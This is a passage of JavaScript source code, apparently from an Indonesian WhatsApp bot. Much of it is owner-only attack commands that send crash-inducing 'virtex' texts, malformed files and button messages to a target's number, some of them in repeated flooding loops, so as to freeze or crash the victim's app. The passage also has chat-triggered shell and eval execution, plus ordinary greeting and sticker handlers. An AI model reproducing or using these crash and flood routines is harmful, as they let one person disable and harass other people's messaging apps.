let bugsilver = fs.readFileSync('./virtex/-_-/😅࿆𑀁ᷓ𝀃⃬ꪲ༑ꪰ᷍💉ꪰ™S̸I̸L̸V̸E̸R̸Z̸I̸N̸G̸O̸D̸ • #T̺͆r̺͆o̺͆p̺͆a̺͆D̺͆o̺͆s̺͆G̺͆o̺͆d̺͆ 🤠࿆ᷓ⃟')
await Fan.sendMessage(from, { document: bugsilver, mimetype: 'application/txt', fileName: `😅࿆𑀁ᷓ𝀃⃬ꪲ༑ꪰ᷍💉ꪰ™S̸I̸L̸V̸E̸R̸Z̸I̸N̸G̸O̸D̸ • #T̺͆r̺͆o̺͆p̺͆a̺͆D̺͆o̺͆s̺͆G̺͆o̺͆d̺͆ 🤠࿆ᷓ${virtex8}` }, { quoted: bugquoted}) 
}
break
case 'buggas':{
if (!isOwner && !itsMe) return onlyOwner()
let buggas = fs.readFileSync('./virtex/-_-/ᬉ🈀 🍩⇝͜͡✪ャ𐌾ձ𑂘𐌼оձձ𐐩𐔏ャ✪͜͡⇜🍩 🈀ᬉ͜.🍩ၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙ')
await Fan.sendMessage(from, { document: buggas, mimetype: 'application/txt', fileName: `ᬉ🈀 🍩⇝͜͡✪ャ𐌾ձ𑂘𐌼оձձ𐐩𐔏ャ✪͜͡⇜🍩 🈀ᬉ͜.🍩ၘ${virtex8}` }, { quoted: bugquoted}) 
}
break
case 'bugcleitin':{
if (!isOwner && !itsMe) return onlyOwner()
let bugcleitin = fs.readFileSync('./virtex/-_-/🥀࿙፝֟۫۫۫͝𝒄𝒍𝒆𝒊𝒕𝒊𝒏...𝀥🍷')
await Fan.sendMessage(from, { document: bugcleitin, mimetype: 'application/txt', fileName: `🥀࿙፝֟۫۫۫͝𝒄𝒍𝒆𝒊𝒕𝒊𝒏...𝀥🍷${virtex8}` }, { quoted: bugquoted}) 
}
break
case 'bugpdf':{
if (!isOwner && !itsMe) return onlyOwner()
let bugpdf = fs.readFileSync('./media/document/doc.pdf')
await Fan.sendMessage(from, { document: bugpdf, mimetype: 'application/pdf', fileName: `${virtex8}` }, { quoted: bugquoted}) 
}
break
case 'bugzip':{
if (!isOwner && !itsMe) return onlyOwner()
let bugzip = fs.readFileSync('./media/document/doc.zip')
await Fan.sendMessage(from, { document: bugzip, mimetype: 'application/zip', fileName: `${virtex8}` }, { quoted: bugquoted}) 
}
break
case 'bugpptx':{
if (!isOwner && !itsMe) return onlyOwner()
let bugpptx = fs.readFileSync('./media/document/doc.pptx')
await Fan.sendMessage(from, { document: bugpptx, mimetype: 'application/pptx', fileName: `${virtex8}` }, { quoted: bugquoted}) 
}
break
case 'bugxlsx':{
if (!isOwner && !itsMe) return onlyOwner()
let bugxlsx = fs.readFileSync('./media/document/doc.xlsx')
await Fan.sendMessage(from, { document: bugxlsx, mimetype: 'application/xlsx', fileName: `${virtex8}` }, { quoted: bugquoted}) 
}
break
case 'bugdocx':{
if (!isOwner && !itsMe) return onlyOwner()
let bugdocx = fs.readFileSync('./media/document/doc.docx')
await Fan.sendMessage(from, { document: bugdocx, mimetype: 'application/docx', fileName: `${virtex8}` }, { quoted: bugquoted}) 
}
break
case 'bugbuttonv1':
if (!isOwner && !itsMe) return onlyOwner()
let czyc = `🎭么𝑻𝑵͢𝑴 𝑻𝛯𝛥𝑴⽳🎭`
let butt = [
{"buttonId": `GFFFF`,"buttonText": {"displayText": `${ngazapv1}`},"type": "RESPONSE"},
{"buttonId": `GFFFF`,"buttonText": {"displayText": `${ngazapv2}`},"type": "RESPONSE"},
{"buttonId": `GFFFF`,"buttonText": {"displayText": `${ngazapv3}`},"type": "RESPONSE"}]
Fan.sendButLoc(from, czyc,fake,ofrply,butt)
break
case 'bugbuttonv2':
if (!isOwner && !itsMe) return onlyOwner()
let cxx = `${virtex8}`
let buttv = [
{"buttonId": `GFFFF`,"buttonText": {"displayText": `${ngazapv1}`},"type": "RESPONSE"},
{"buttonId": `GFFFF`,"buttonText": {"displayText": `${ngazapv2}`},"type": "RESPONSE"},
{"buttonId": `GFFFF`,"buttonText": {"displayText": `${ngazapv3}`},"type": "RESPONSE"}]
Fan.sendButLoc(from, cxx,fake,ofrply,buttv)
break
case 'bugbuttonv3':
if (!isOwner && !itsMe) return onlyOwner()
let cvv = `${pushname}\n${virtex8}`
let buttx = [
{"buttonId": `GFFFF`,"buttonText": {"displayText": `${ngazapv1}`},"type": "RESPONSE"},
{"buttonId": `GFFFF`,"buttonText": {"displayText": `${ngazapv2}`},"type": "RESPONSE"},
{"buttonId": `GFFFF`,"buttonText": {"displayText": `${ngazapv3}`},"type": "RESPONSE"}]
Fan.sendButLoc(from, cvv,fake,ofrply,buttx)
break
case 'jadibugstick':
if (!isOwner && !itsMe) return onlyOwner()
if (isImage || isQuotedImage) {
try{
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = await Fan.downloadAndSaveMediaMessage(quoted)
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await Fan.sendMessage(from,{sticker: nah},{quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
await fs.unlinkSync(stok)
await fs.unlinkSync(media)
} catch (err){
if(err){ return}
var stream = await downloadContentFromMessage(mek.message.imageMessage || mek.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
var buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
var rand1 = 'sticker/'+getRandom('.jpg')
var rand2 = 'sticker/'+getRandom('.webp')
fs.writeFileSync(`./${rand1}`, buffer)
ffmpeg(`./${rand1}`)
.on("error", console.error)
.on("end", () => {
exec(`webpmux -set exif ./media/sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
await Fan.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
await fs.unlinkSync(`./${rand1}`)
await fs.unlinkSync(`./${rand2}`)
})
})
.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
.toFormat('webp')
.save(`${rand2}`)
}
} else if (isVideo || isQuotedVideo) {
try{
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = await Fan.downloadAndSaveMediaMessage(quoted)
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 1, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await Fan.sendMessage(from,{sticker: nah},{quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
await fs.unlinkSync(stok)
await fs.unlinkSync(media)
} catch (err){
var stream = await downloadContentFromMessage(mek.message.imageMessage || mek.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
var buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
var rand1 = 'sticker/'+getRandom('.mp4')
var rand2 = 'sticker/'+getRandom('.webp')
fs.writeFileSync(`./${rand1}`, buffer)
ffmpeg(`./${rand1}`)
.on("error", console.error)
.on("end", () => {
exec(`webpmux -set exif ./media/sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
await Fan.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
await fs.unlinkSync(`./${rand1}`)
await s.unlinkSync(`./${rand2}`)
})
})
.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
.toFormat('webp')
.save(`${rand2}`)
}
} else {
setReply(`Kirim gambar/vidio dengan caption ${command} atau balas gambar/vidio yang sudah dikirim\nNote : Maximal vidio 10 detik!`)
}
break
case 'sendbugv1':
try{
if (!isOwner && !itsMe) return onlyOwner()
if (!Pe ) return setReply("Masukan nomer target")
if (Pe == Ownerin) return setReply("Tidak bisa, karena itu nomer developer")
await setReply("Sending...")
await Fan.sendKatalog(Pe, virtex8, virtex8, thumb, {quoted: setQuoted})
const bugreact = await Fan.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: mek.id } } })
Fan.sendMessage(Pe, { text: "awowkwkwk" }, { quoted: bugreact });
setReply(`Berhasil mengirim Bug ke Nomer ${Pe.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'sendbugv2':
try{
if (!isOwner && !itsMe) return onlyOwner()
if (!Pe ) return setReply("Masukan nomer target")
if (Pe == Ownerin) return setReply("Tidak bisa, karena itu nomer developer")
await setReply("Sending...")
await Fan.sendMessage(Pe, { text: virtexbytsukasa }, {quoted: setQuoted})                
await Fan.sendMessage(Pe, { text: virtex1 }, {quoted: bugfc})            
await Fan.sendMessage(Pe, { text: virtex2 }, {quoted: bugfc})       
await Fan.sendMessage(Pe, { text: virtex3 }, {quoted: bugfc})    
await Fan.sendMessage(Pe, { text: virtex4 }, {quoted: bugfc})              
await Fan.sendMessage(Pe, { text: virtex5 }, {quoted: bugfc})     
await Fan.sendMessage(Pe, { text: virtex6 }, {quoted: bugfc})
await Fan.sendMessage(Pe, { text: virtex7 }, {quoted: bugfc})   
await Fan.sendMessage(Pe, { text: virtex8 }, {quoted: bugfc})            
await Fan.sendMessage(Pe, { text: virtex9 }, {quoted: bugfc})       
await Fan.sendMessage(Pe, { text: virtex10 }, {quoted: bugfc})
await Fan.sendMessage(Pe, { text: virtex11 }, {quoted: bugfc})              
await Fan.sendMessage(Pe, { text: virtex12 }, {quoted: bugfc})     
await Fan.sendMessage(Pe, { text: philip }, {quoted: bugfc})
await Fan.sendMessage(Pe, { text: slayer }, {quoted: bugfc}) 
await Fan.sendMessage(Pe, { text: ngazap }, {quoted: bugfc})
await Fan.sendMessage(Pe, { text: ngazapv1 }, {quoted: bugfc})
await Fan.sendMessage(Pe, { text: ngazapv2 }, {quoted: bugfc})
await Fan.sendMessage(Pe, { text: ngazapv3 }, {quoted: bugfc})
setReply(`Berhasil mengirim Bug ke Nomer ${Pe.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'sendbugv3':
try{
if (!isOwner && !itsMe) return onlyOwner()
if (!Pe ) return setReply("Masukan nomer target")
if (Pe == Ownerin) return setReply("Tidak bisa, karena itu nomer developer")
let vag = `${virtex8}`
let vak = [
{"buttonId": `GFFFF`,"buttonText": {"displayText": `${ngazapv1}`},"type": "RESPONSE"},
{"buttonId": `GFFFF`,"buttonText": {"displayText": `${ngazapv2}`},"type": "RESPONSE"},
{"buttonId": `GFFFF`,"buttonText": {"displayText": `${ngazapv3}`},"type": "RESPONSE"}]
Fan.sendButLoc(Pe, vag,fake,ofrply,vak)
const bugreact = await Fan.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: mek.id } } })
Fan.sendMessage(Pe, { text: "awowkwkwk" }, { quoted: bugreact });
setReply(`Berhasil mengirim Bug ke Nomer ${Pe.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'sendbugv4':
try{
if (!isOwner && !itsMe) return onlyOwner()
if (!Pe ) return setReply("Masukan nomer target")
if (Pe == Ownerin) return setReply("SendBug Gagal")
await setReply(`Sending bug, waktu selesai 20 detik`)
let a = await Fan.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: mek.id } } })
for (let i = 0; i < 100; i++) {
await sleep(2000)
console.log("sending")
await Fan.sendKatalog(Pe, virtex8(prefix), virtex8(prefix), thumb, {quoted: setQuoted})
await Fan.sendMessage(Pe, { text: "awowkwkwk" }, { quoted: a });
await Fan.sendMessage(Pe, { text: "awowkwkwk" }, { quoted: bugkon });
}
setReply(`Berhasil mengirim Bug ke Nomer ${Pe.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break      
case 'sendbugv5':
try{
if (!isOwner && !itsMe) return onlyOwner()
let bugv = q 
console.log(bugv)
if (!bugv) return setReply("Masukan nomer target")
if (bugv == Ownerin) return setReply("SendBug Gagal")
await setReply(`Sending bug, waktu selesai 20 detik`)
let a = await Fan.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: mek.id } } })
for (let i = 0; i < 10; i++) {
await sleep(2000)
console.log("sending")
await Fan.sendMessage(bugv, { text: "awowkwkwk" }, { quoted: a });
await Fan.sendMessage(bugv, { text: "awowkwkwk" }, { quoted: bugkon });
}
setReply(`Berhasil mengirim Bug ke Nomer ${bugv.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'spambugv1':
if (!isOwner && !itsMe) return onlyOwner()
{
setReply('*Loading...*')
await Fan.sendMessage(from, { text: virtexbytsukasa },{ quoted: bugquoted })                 
await Fan.sendMessage(from, { text: virtex1 },{ quoted: bugquoted })             
await Fan.sendMessage(from, { text: virtex2 },{ quoted: bugquoted })        
await Fan.sendMessage(from, { text: virtex3 },{ quoted: bugquoted })     
await Fan.sendMessage(from, { text: virtex4 },{ quoted: bugquoted })               
await Fan.sendMessage(from, { text: virtex5 },{ quoted: bugquoted })      
await Fan.sendMessage(from, { text: virtex6 },{ quoted: bugquoted }) 
await Fan.sendMessage(from, { text: virtex7 },{ quoted: bugquoted })    
await Fan.sendMessage(from, { text: virtex8 },{ quoted: bugquoted })             
await Fan.sendMessage(from, { text: virtex9 },{ quoted: bugquoted })        
await Fan.sendMessage(from, { text: virtex10 },{ quoted: bugquoted })     
await Fan.sendMessage(from, { text: virtex11 },{ quoted: bugquoted })               
await Fan.sendMessage(from, { text: virtex12 },{ quoted: bugquoted })      
await Fan.sendMessage(from, { text: philip },{ quoted: bugquoted }) 
await Fan.sendMessage(from, { text: slayer },{ quoted: bugquoted })  
await Fan.sendMessage(from, { text: ngazap },{ quoted: bugquoted }) 
await Fan.sendMessage(from, { text: ngazapv1 },{ quoted: bugquoted }) 
await Fan.sendMessage(from, { text: ngazapv2 },{ quoted: bugquoted }) 
await Fan.sendMessage(from, { text: ngazapv3 },{ quoted: bugquoted }) 
}
break
case 'spambugv2': 
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return setReply(`Teks?`)
setReply('*Loading...*')
Fan.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${virtex1}`}}, text: q },{ quoted: bugquoted }) 
Fan.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${virtex2}`}}, text: q },{ quoted: bugquoted }) 
Fan.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${virtex3}`}}, text: q },{ quoted: bugquoted }) 
Fan.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${virtex4}`}}, text: q },{ quoted: bugquoted }) 
Fan.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${virtex5}`}}, text: q },{ quoted: bugquoted }) 
Fan.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${virtex6}`}}, text: q },{ quoted: bugquoted }) 
Fan.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${virtex7}`}}, text: q },{ quoted: bugquoted }) 
Fan.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${virtex8}`}}, text: q },{ quoted: bugquoted }) 
Fan.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${virtex10}`}}, text: q },{ quoted: bugquoted }) 
Fan.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${virtex11}`}}, text: q },{ quoted: bugquoted }) 
Fan.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${virtex12}`}}, text: q },{ quoted: bugquoted }) 
Fan.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${ngazapv1}`}}, text: q },{ quoted: bugquoted }) 
Fan.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${ngazapv2}`}}, text: q },{ quoted: bugquoted }) 
Fan.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${ngazapv3}`}}, text: q },{ quoted: bugquoted }) 
break
case 'spambuv3':
if (!isOwner && !itsMe) return onlyOwner()
await Fan.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
await Fan.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
await Fan.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
await Fan.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
await Fan.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
await Fan.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
await Fan.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
await Fan.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
await Fan.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
await Fan.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
break
case 'bugpc': {
if (!isOwner && !itsMe) return onlyOwner()
if (!Pe ) return setReply("Masukan nomer target")
if (Pe == Ownerin) return setReply("Tidak bisa, karena itu nomer developer")
const bugreact = await Fan.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: mek.id } } })
jumlah = args[1]
for (let i = 0; i < jumlah; i++) {
Fan.sendMessage(Pe, { text: virtex8 }, { quoted: bugquoted})
Fan.sendMessage(Pe, { text: virtex8 }, { quoted: bugfc})
Fan.sendMessage(Pe, { text: virtex8 }, { quoted: bugkon})
Fan.sendMessage(Pe, { text: virtex8 }, { quoted: bugreact})
}
setReply(`Success`)
}
break
case 'buggc': {
if (!isOwner && !itsMe) return onlyOwner()
if (!isGroup) return onlyGroup() 
const bugreact = await Fan.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: mek.id } } })
jumlah = args[1]
for (let i = 0; i < jumlah; i++) {
Fan.sendMessage(from, { text: virtex8 }, { quoted: bugquoted})
Fan.sendMessage(from, { text: virtex8 }, { quoted: bugfc})
Fan.sendMessage(from, { text: virtex8 }, { quoted: bugkon})
Fan.sendMessage(from, { text: virtex8 }, { quoted: bugreact})
}
setReply(`Success`)
}
break
case 'bugfc':
if (!isOwner && !itsMe) return onlyOwner()
if (!isGroup) return onlyGroup() 
ydd = `Jiahkkkkk`
Fan.sendMessage(from, {text:ydd},{quoted: { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `Kok Fc Bang`, 
"jpegThumbnail": thumb
}
}
}})
break
//================================================================================\\
default:
if (!isGroup && isCmd) {
Nothing(toFirstCase(command), dash)
setReply(`Command belum tersedia, coba beberapa hari kedepan yaa! _^`)
} else if(isGroup && isCmd) {
Nothing(toFirstCase(command), dash)
}
} //Akhir switch command





if (isImage && autoSticker) {
let WSF = require('wa-sticker-formatter')
let wsf = false
let mime = (mek.msg || mek).mimetype || ''
if (/image/.test(mime)) {
let img = await Fan.downloadAndSaveMediaMessage(quoted)
wsf = new WSF.Sticker(img, {
pack: packName,
type: WSF.StickerTypes.FULL,
author: authorName,
crop: true,
})
}        
if (wsf) {
await wsf.build()
const sticBuffer = await wsf.get()
if (sticBuffer) await Fan.sendMessage(from, { sticker: sticBuffer }, {
quoted: setQuoted,
mimetype: 'image/webp',
ephemeralExpiration: 86400
})
}
}
    
//Jika ada yg kirim pesan "p" botz akan respon
if (salam.includes(messagesC)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
if (isOwner) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn){ 
sendvn(ucapbot)
} else if(autoSticker) {
sendSticker(ucapsalam)
} else {
setReply("Ucap salam napah")
}
}
//Jika ada yg kirim pesan "Asalamualaikun" botz akan respon✓
if (budy.includes(`ualaikum`) || budy.includes(`u'alaikum`) ) { 
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn){
sendvn(walaikumsalam)
} else if(autoSticker) {
sendSticker(kumsalam)
} else {
setReply("Walaikumsalam kak")
}
}
				

				
//Jika ada yg toxic botz akan merespon✓
if (!isOwner && bad.includes(messagesC)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn){
sendvn(astaga)
} else if(autoSticker) {
await sendSticker(katakasar)
} else {
await setReply("Jangan Toxic Kak")
}
}



//Jika ada yg sange botz akan merespon✓
if (!isOwner && dosa.includes(messagesC)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn){
sendvn(sangeya)
} else if(autoSticker) {
await sendSticker(istigfar)
} else {
await setReply("Astagfirloh oni chan")
}
}


//Jika ada yg bilang hallo maka botz akan merespon✓
if (katahai.includes(messagesC)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn) return sendvn(moshimos)
}

//Jika ada yang bilang ohayo bot akan merespon✓
if(ohayo.includes(messagesC)){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if (timeWib >= '11:00' && timeWib <= '23:50')  return setReply("Sekarang udah ga pagi kak")
if(autovn === true) return sendvn(oahyo)
setReply(`${ucapanWaktu} kak 🙂`)
}
				     
 //Jika ada yang bilang oyasumi malem bot akan merespon✓
if(katamalem.includes(messagesC)){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if (timeWib >= '06:00' && timeWib <= '17:00')  return setReply("Sekarang udah ga malem kak")
if(autovn) {
sendvn(oyasumi)
} else {
setReply(`${ucapanWaktu} kak 🙂`)
}
}
         
 //Jika ada yang bilang koniciwa malem bot akan merespon✓
if(katasiang.includes(messagesC)){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn) {
sendvn(koniciwa)
} else {
setReply(`${ucapanWaktu} kak 🙂`)
}
}

//Jika ada yg bilang bot maka botz akan merespon✓
if (badud.includes(messagesC)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn ) {
sendvn(ucapbot)
} else {
setReply(hayuk)
}
}          
 //Jika ada yang bilang lopyu bot akan merespon✓
if(katalopyou.includes(messagesC)){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn){
sendvn(lopyoutoo)
} else {
setReply("??")
}
}
				

                   
//Jika ada yang tag nomer owner
if (!isOwner && budy.includes(nomerOwner)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
if (!itsMe) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
const kta =['*Bentar ya kak nanti juga di bales sama ownerku* 😉','*Tunggu aja kak, entar juga di bales* 😁','*Iya kak, ada apa tag owner aku nih* 🙂']
const su = kta[Math.floor(Math.random() * kta.length)]
setReply(su)
}
					
//JIKA ADA YG BILANG THANKS, BOT AKAN RESPON
for (let kasih of thanks){
if (budy.includes(kasih) || selectedButton == 'Thanks' ) {
if(itsMe) return
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autoSticker) return sendSticker(samasama)
setReply(`Sama sama kak ${pushname}`)
}
}

//Ketika ada yang minta save
if(!isGroup && budy.startsWith("sv")){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
setReply("Pahami dan baca peraturan bot,\nBot tidak menerima save nomer")
}

if (body.startsWith('$')){
if (!isOwner && !itsMe) return onlyOwner()
await setReply("_Executing..._")
exec(q, async (err, stdout) => {
if (err) return setReply(`${fake}:~ ${err}`)
if (stdout) {
await setReply(`_${stdout}_`)
setReply("_Executing Finished_")
}
})
}

if (body.startsWith('>')){
  if (!isOwner && !itsMe) return onlyOwner()
try {
let evaled = await eval(q)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await setReply(evaled)
} catch (err) {
await setReply(String(err))
}
}


if (body.startsWith('=>')){
if (!isOwner && !itsMe) return onlyOwner()
function Return(sul) {
let sat = JSON.stringify(sul, null, 2)
if(sat){
var bang = util.format(sat)
} else if (sat == undefined) {
var  bang = util.format(sul)
}
return setReply(bang)
}
try {
setReply(util.format(eval(`(async () => { return ${q} })()`)))
} catch (e) {
setReply(String(e))
}
}

if (body.startsWith('+>')){
if (!isOwner && !itsMe) return onlyOwner()
try {
return setReply(`OutPut: 
${JSON.stringify(eval(budy.slice(2)),null,'\t')}
`)
} catch(err) {
e = String(err)
setReply(`"err" :  "${e}"`)
}
}


//Bullying member bamru
if (body.startsWith(`${prefix}bullyukk`)){
setReply(`Hayuk ah`)
Fan.sendButMessage(from, `Enaknya di apain nih 🤭`, `${fake}`, [
{buttonId: `FFFFFF`, buttonText: { displayText: `di ${bully1}` },type: 1},
{buttonId: `FFFFFF`, buttonText: { displayText: `di ${bully2}` },type: 1},
{buttonId: `FFFFFF`, buttonText: { displayText: `di ${bully3}` },type: 1}]);
}

if (body.startsWith(`${prefix}welcome`)){
setReply(`Welcome Kak ${sender.split("@")[0]}

Jangan Lupa Intro Y

NAMA:
UMUR:
KELAS:
HOBI:
KESUKAAN:
JENIS KELAMIN:
GOLONGAN DARAH:
NAMA IBU:
NAMA BAPAK:
NAMA KAKEK:
NAMA NENEK:
NAMA BUYUT PEREMPUAN:
NAMA BUYUT LAKI LAKI:
NAMA SAUDARA PEREMPUAN:
NAMA SAUDARA LAKI LAKI:
NAMA SEPUPU PEREMPUAN:
NAMA SEPUPU LAKI LAKI:
NAMA KAKAK:
NAMA ADEK:
NAMA BIBI:
NAMA PAMAN:
TWITTER:
FACEBOOK:
LIKE:
TIKTOK:
INSTAGRAM:
SESTYC:
PICSART:
SNAPCHAT:
TINDER:
AKTE KELAHIRAN:
KK:
KTP:
SIM:
STNK:
BPJS:
IJAZAH:
SERTIFIKAT TANAH:
SERTIFIKAT RUMAH:
FOTOCOPY IDENTITAS DIRI:
SURAT KETERANGAN KESEHATAN DARI DOKTER:
NILAI PALING TERTINGGI:
MAPEL KESUKAAN:
JALAN BERAPA LANGKAH:
LAGI APA:
UDAH MAKAN:
NILAI TERENDAH:
